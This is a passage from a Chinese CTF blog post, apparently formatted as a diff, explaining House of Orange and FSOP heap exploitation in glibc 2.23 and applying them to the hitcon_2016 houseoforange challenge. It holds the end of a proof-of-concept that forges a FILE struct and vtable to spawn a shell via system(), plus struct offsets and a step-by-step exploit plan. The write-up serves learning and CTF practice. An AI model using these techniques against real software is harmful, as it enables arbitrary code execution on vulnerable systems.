+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="kt">size_t</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">fp</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FILE</span><span class="p">))</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span> <span class="n">jump_table</span><span class="p">;</span> <span class="c1">// top+0xd8
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Finally, trigger the whole chain by calling malloc */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc</span><span class="p">(</span><span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">     The libc&#39;s error message will be printed to the screen
+</span></span></span><span class="line"><span class="cl"><span class="cm">     But you&#39;ll get a shell anyways.
+</span></span></span><span class="line"><span class="cl"><span class="cm">   */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">winner</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span> 
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>伪造fake_vtable和fake_fp，unsortedbinattack改_IO_list_all为main_area+88,则0x60大小的smallbin位置为一个chain，在哪里放好fake_fp，fake_fp的vtable为fake_vtable</p>
+<h3 id="fsop布局">FSOP布局
+</h3><p>首先篡改_IO_list_all为main_arena+88这个地址，chain字段是首地址加上0x68偏移得到的。因此chain字段决定了下一个IO_FILE结构体的地址为main_arena+88+0x68，这个地址恰好是smallbin中size为0x60的数组，如果我们能将一个chunk放到这个small bin中size为0x60的链上，那么篡改_IO_list_all为main_arena+88这个地址后，small bin中的chunk就是IO_FILE结构体了，将其申请出来后，我们就可以控制这块内存了，从而伪造vtable字段进行布局最终拿到shell。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/51227729/1772894023071-2d861332-a4f2-4364-a95a-250002d3c943.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h3 id="需要绕过的检查">需要绕过的检查
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	   <span class="o">||</span> <span class="p">(</span><span class="nf">_IO_vtable_offset</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	       <span class="o">&amp;&amp;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
+</span></span><span class="line"><span class="cl">				    <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	   <span class="p">)</span>
+</span></span><span class="line"><span class="cl">	  <span class="o">&amp;&amp;</span> <span class="nf">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">EOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">EOF</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">result</span> <span class="o">=</span> <span class="n">EOF</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通常满足那个比较省事的，只需要让mode=0,_IO_write_base=0,_IO_write_ptr=1即可</p>
+<p>house of orange的成功概率是1/2，因为触发_IO_flush_all_lockp时会根据_IO_list_all和chain字段来去依次遍历链表上的每个结构体，在我们整体布局完成后，第一个结构体就是从main_arena+88开始。而第一个结构体的mode字段是main_arena+88+0xc0处的数据决定的，main_arena+88+0xc0处储存的地址是libc随机化的，所以mode的&gt;0的概率是1/2，当mode&gt;0时会fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr&gt; fp-&gt;_wide_data-&gt;_IO_write_base，导致在第一个FILE触发overflow 而我们的布局是在第二个FILE上的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="mh">0x0</span>   <span class="n">_flags</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x8</span>   <span class="n">_IO_read_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x10</span>  <span class="n">_IO_read_end</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x18</span>  <span class="n">_IO_read_base</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x20</span>  <span class="n">_IO_write_base</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x28</span>  <span class="n">_IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x30</span>  <span class="n">_IO_write_end</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x38</span>  <span class="n">_IO_buf_base</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x40</span>  <span class="n">_IO_buf_end</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x48</span>  <span class="n">_IO_save_base</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x50</span>  <span class="n">_IO_backup_base</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x58</span>  <span class="n">_IO_save_end</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x60</span>  <span class="n">_markers</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x68</span>  <span class="n">_chain</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x70</span>  <span class="n">_fileno</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x74</span>  <span class="n">_flags2</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x78</span>  <span class="n">_old_offset</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x80</span>  <span class="n">_cur_column</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x82</span>  <span class="n">_vtable_offset</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x83</span>  <span class="n">_shortbuf</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x88</span>  <span class="n">_lock</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x90</span>  <span class="n">_offset</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0x98</span>  <span class="n">_codecvt</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xa0</span>  <span class="n">_wide_data</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xa8</span>  <span class="n">_freeres_list</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xb0</span>  <span class="n">_freeres_buf</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xb8</span>  <span class="n">__pad5</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xc0</span>  <span class="n">_mode</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xc4</span>  <span class="n">_unused2</span>
+</span></span><span class="line"><span class="cl"><span class="mh">0xd8</span>  <span class="n">vtable</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">_IO_jump_t</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/* showmany */</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="buuhouseoforange_hitcon_2016">[BUU]houseoforange_hitcon_2016
+</h2><p>版本2.23程序模拟管理orange的house，我们每次add时，程序会malloc三个chunk,第一个储存chunk大小和内容的地址，第二个是我们真正申请的chunk,第三个储存orange的color和price,但是这两个属性在这个题里没什么用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">sub_107C</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">_DWORD</span> <span class="o">*</span><span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-14h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">unk_203074</span> <span class="o">&gt;</span> <span class="mi">2u</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;You can&#39;t upgrade more&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">house</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No such house !&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Length of name :&#34;</span><span class="p">);</span><span class="c1">//堆溢出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">v2</span> <span class="o">=</span> <span class="nf">getnum</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">v2</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Name:&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">getcontent</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">house</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">v2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Price of Orange: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v1</span> <span class="o">=</span> <span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">*</span><span class="n">house</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">*</span><span class="n">v1</span> <span class="o">=</span> <span class="nf">getnum</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">color</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Color of Orange: &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="nf">getnum</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">!=</span> <span class="mi">56746</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">v3</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v3</span> <span class="o">&gt;</span> <span class="mi">7</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;No such color&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v3</span> <span class="o">==</span> <span class="mi">56746</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">house</span> <span class="o">+</span> <span class="mi">4LL</span><span class="p">)</span> <span class="o">=</span> <span class="mi">56746</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="n">house</span> <span class="o">+</span> <span class="mi">4LL</span><span class="p">)</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">30</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="o">++</span><span class="n">unk_203074</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Finish&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>edit函数里有一个堆溢出，chunk大小&lt;0x1000，应该是防house of force,没有free函数，所以可以用house_of_orange。同时由于没有free函数，fd bk不会清除，可以泄露地址</p>
+<h3 id="思路">思路
+</h3><p>1 house of orange制造unsrotedbin_chunk</p>
+<p>2 申请一个largebin大小的chunk，这样既可以泄露libc又可以泄露堆地址</p>
+<p>3 unsortedbin修改_IO_list_all为mainarea+88</p>
+<p>4 FSOP，_flags修改为binsh,vtable修改为&amp;vtable,然后修改overflow为system</p>
+<p>5再次malloc触发fsop</p>
+<p>其中 3 4由一次堆溢出完成</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/pwn/">Pwn</a>
+        
+            <a href="/tags/house%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0/">House系列学习</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-husk34c3ctf-readme_revenge/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/husk/House_of_husk.jpg" loading="lazy" data-key="" data-hash="/image/husk/House_of_husk.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of husk&amp;&amp;34c3CTF readme_revenge</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-stormbuu-0ctf_2018_heapstorm2/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_storm.jpg" loading="lazy" data-key="" data-hash="/image/House_of_storm.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of storm&amp;&amp;[BUU] 0ctf_2018_heapstorm2</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/house-of-forcegyctf_2020_force/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/House_of_force.jpg" loading="lazy" data-key="" data-hash="/image/House_of_force.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">House of force&amp;&amp;gyctf_2020_force</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/xswctf2025%E5%88%9D%E8%B5%9Bpwn-wp/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/XSWCTF_2.jpg" loading="lazy" data-key="" data-hash="/image/XSWCTF_2.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">XSWCTF2025初赛Pwn wp</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/bss%E6%AE%B5%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/image/bssfmt.jpg" loading="lazy" data-key="" data-hash="/image/bssfmt.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">bss段上格式化字符串漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2025 - 
+        
+        2026 chang
+    </section>
+    
+    <section class="powerby">
+        
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.a2bdfcd44ef572203220652568b318b0d339e1b66627df894cad45601e4caa56.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<style>
+  body {
+     
+    background: url("/background/Ai.jpg") no-repeat center top;
+    background-size: cover;
+    background-attachment: fixed;
+     
+    margin: 0;  
+    min-height: 100vh;  
+  }
+
+ 
+  .container {
+    position: relative;
+  }
+  .container::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #fda2e363; 
+    z-index: -1; 
+  }  
+
+
+
+
+  
+
+
+</style>
+<script src="/background/sakura.js"></script>
+
+
+
+<script defer src="https://cn.vercount.one/js"></script>
+
+    </body>
+</html>
